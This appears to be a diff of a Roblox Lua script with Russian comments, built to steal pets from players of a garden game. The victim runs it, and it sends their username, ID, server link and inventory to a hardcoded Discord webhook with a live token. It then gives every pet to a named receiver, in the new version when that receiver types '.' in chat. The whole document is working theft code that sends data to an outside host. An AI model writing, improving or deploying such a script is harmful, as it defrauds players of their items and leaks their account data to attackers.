@@ -1,156 +1,114 @@
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+
 local player = Players.LocalPlayer
 
--- 🔧 НАСТРОЙКИ (ЗАМЕНИТЕ!) --
+-- 🔧 НАСТРОЙКИ
 local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1401556845847646329/FeLb65sSQ660GjWF0PyUZGFpWb5ndW-9CZmY6Vw2rz-E0jEBqS886LFoLAaG4O4aG4SR"
-local YOUR_USER_ID = 7719284192 -- Ваш Roblox ID
-local WHITELIST = {"Wasp"} -- Белый список питомцев
-local TARGET_PLAYER = "Rikizigg" -- Или ID получателя
-local TRANSFER_DELAY = 1 -- Задержка между передачами (в секундах)
+local TARGET_PLAYER = "Rikizigg" -- Ник получателя
+local TRIGGER_MESSAGE = "." -- Сообщение-триггер в чате
+local DELAY_BETWEEN_ACTIONS = 1 -- Задержка между действиями (секунды)
 
--- 🎯 Поиск RemoteEvent для передачи (адаптируй под свою игру!)
-local function findTransferRemote()
-    -- Варианты названий RemoteEvent (проверь в DEX)
-    local possibleNames = {
-        "PetTransferEvent",
-        "TradeRemote",
-        "InventoryTransfer",
-        "BackpackHandler"
-    }
+-- 🐾 Получить всех питомцев в инвентаре
+local function getAllPets()
+    local pets = {}
+    local backpack = player:FindFirstChild("Backpack") or player.Character
     
-    for _, name in ipairs(possibleNames) do
-        local remote = ReplicatedStorage:FindFirstChild(name, true) -- Рекурсивный поиск
-        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
-            return remote
+    for _, item in ipairs(backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            table.insert(pets, item.Name)
         end
     end
-    return nil
+    
+    return pets
 end
 
--- 📨 Улучшенная отправка в Discord с кнопкой
-local function sendToDiscord(text)
+-- ✋ Автоматически взять питомца в руку
+local function equipPet(petName)
+    local pet = player.Backpack:FindFirstChild(petName)
+    if pet then
+        player.Character.Humanoid:EquipTool(pet)
+        task.wait(DELAY_BETWEEN_ACTIONS)
+        return true
+    end
+    return false
+end
+
+-- 📤 Отправить питомца
+local function transferPet(petName)
+    local target = Players:FindFirstChild(TARGET_PLAYER)
+    if not target then return false end
+
+    if equipPet(petName) then
+        local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+        PetGiftingService:FireServer("GivePet", target)
+        return true
+    end
+    return false
+end
+
+-- 📨 Форматирование Discord-уведомления
+local function createEmbed(petsList)
     local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
-    local data = {
-        content = text,
-        components = {{
-            type = 1,
-            components = {{
-                type = 2,
-                label = "Присоединиться к серверу",
-                style = 5,
-                url = serverLink
-            }}
+    
+    return {
+        content = "🔄 Готов к передаче питомцев!",
+        embeds = {{
+            title = "Grow a Garden - Pet Transfer System",
+            color = 16753920, -- Оранжевый
+            fields = {
+                {name = "📌 Отправитель", value = player.Name, inline = true},
+                {name = "🎯 Получатель", value = TARGET_PLAYER, inline = true},
+                {name = "🔗 Подключиться к серверу", value = "[Кликните здесь]("..serverLink..")", inline = false},
+                {name = "🐾 Питомцы в инвентаре ("..#petsList..")", value = "```"..table.concat(petsList, "\n").."```", inline = false}
+            },
+            footer = {text = "Ожидаю команду '"..TRIGGER_MESSAGE.."' в чате"},
+            timestamp = DateTime.now():ToIsoDate()
         }}
     }
+end
+
+-- 📤 Отправить уведомление в Discord
+local function sendInventoryUpdate()
+    local pets = getAllPets()
+    local data = createEmbed(pets)
     
-    -- Лучший вариант через syn
-    if syn and syn.request then
-        return syn.request({
-            Url = DISCORD_WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-    end
-    
-    -- Fallback для обычного HttpService
     pcall(function()
         HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode(data))
     end)
 end
 
--- 🐕 Получение питомцев + проверка веса/возраста
-local function getEligiblePets()
-    local pets = {}
-    for _, item in ipairs(player.Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local petName, weight, age = item.Name:match("^(%w+).*%[(%d+%.%d+) KG%].*%[(%d+)")
-            if petName and table.find(WHITELIST, petName) then
-                table.insert(pets, {
-                    object = item,
-                    name = petName,
-                    weight = tonumber(weight),
-                    age = tonumber(age)
-                })
+-- 👂 Обработчик чата
+local function onChatMessage(message, speaker)
+    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
+        local pets = getAllPets()
+        
+        for _, petName in ipairs(pets) do
+            if transferPet(petName) then
+                print("✅ Успешно передан:", petName)
+                task.wait(DELAY_BETWEEN_ACTIONS)
             end
         end
-    end
-    
-    -- Сортировка по весу (от тяжелых к легким)
-    table.sort(pets, function(a, b) return a.weight > b.weight end)
-    return pets
-end
-
--- 🔄 Автоматическая передача предметов
-local function transferPets(targetPlayerName)
-    local transferRemote = findTransferRemote()
-    if not transferRemote then
-        warn("⚠️ RemoteEvent для передачи не найден!")
-        return false
-    end
-    
-    local targetPlayer = Players:FindFirstChild(targetPlayerName)
-    if not targetPlayer then
-        warn("⚠️ Игрок", targetPlayerName, "не найден на сервере!")
-        return false
-    end
-
-    local pets = getEligiblePets()
-    if #pets == 0 then
-        print("ℹ️ Нет подходящих питомцев для передачи")
-        return false
-    end
-
-    -- Отправка каждого предмета
-    for _, pet in ipairs(pets) do
-        local success, err = pcall(function()
-            -- Вариант вызова (адаптируй под свою игру):
-            -- 1. Через RemoteEvent
-            transferRemote:FireServer("TransferPet", targetPlayer, pet.object)
-            
-            -- 2. Или если нужно использовать RemoteFunction
-            -- transferRemote:InvokeServer("GiveItem", targetPlayer, pet.object.Name)
-            
-            print("✅ Передаем:", pet.name, "| Вес:", pet.weight, "KG")
-            task.wait(TRANSFER_DELAY)
-        end)
         
-        if not success then
-            warn("❌ Ошибка при передаче", pet.name..":", err)
-        end
+        sendInventoryUpdate() -- Обновляем статус после передачи
     end
-    
-    return true
 end
 
--- 📡 Основной поток
-local pets = getEligiblePets()
-local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
-local reportMessage = string.format(
-    "🔔 **Игрок инжектил скрипт!**\n"..
-    "👤 **Ник:** %s\n"..
-    "🆔 **ID:** %d\n"..
-    "🌐 **Сервер:** [Кликни чтобы зайти](%s)\n\n"..
-    "🐾 **Доступные питомцы (%d):**\n%s\n\n"..
-    "```autohotkey\n!transfer %d\n```",
-    player.Name,
-    player.UserId,
-    serverLink,
-    #pets,
-    table.concat(pets, "\n"),
-    player.UserId
-)
-
--- Отправляем отчет в Discord
-sendToDiscord(reportMessage)
-
--- Автоматическая передача при появлении получателя
-Players.PlayerAdded:Connect(function(newPlayer)
-    if newPlayer.Name == TARGET_PLAYER or newPlayer.UserId == YOUR_USER_ID then
-        transferPets(newPlayer.Name)
+-- 🔗 Подключение к чату
+if TextChatService then
+    TextChatService.OnIncomingMessage = function(message)
+        onChatMessage(message.Text, Players:FindFirstChild(message.TextSource.Name))
     end
-end)
+else
+    game:GetService("Players").PlayerChatted:Connect(function(chatType, speaker, message)
+        if chatType == Enum.PlayerChatType.All then
+            onChatMessage(message, speaker)
+        end
+    end)
+end
 
-print("✅ Скрипт активирован. Ожидаем получателя...")
+-- 🚀 Инициализация
+sendInventoryUpdate()
+print("✅ Система активирована. Ожидаю команду '"..TRIGGER_MESSAGE.."' от", TARGET_PLAYER)
